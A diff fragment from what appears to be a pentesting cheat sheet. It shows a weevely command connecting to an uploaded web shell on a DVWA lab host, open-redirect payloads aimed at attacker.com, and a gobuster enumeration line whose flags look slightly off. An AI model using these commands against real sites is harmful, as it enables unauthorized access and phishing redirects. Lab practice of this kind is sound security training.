@@ -98,7 +98,7 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 
 #OPEN REDIRECT
 [+] Add “domain_name=any_url" at the end of redirecting URL
-[+] if url redirects to a login page use “checkout_url=attacker.com" at the end of main URL
+[+] if url redirects to a login page use “checkout_url=.attacker.com" at the end of main URL
 
 #BYPASS A 404
 [+]Enumerate with "gobuster dir -u (URL) -u (wordlist_path) -x (.exentension eg .php)
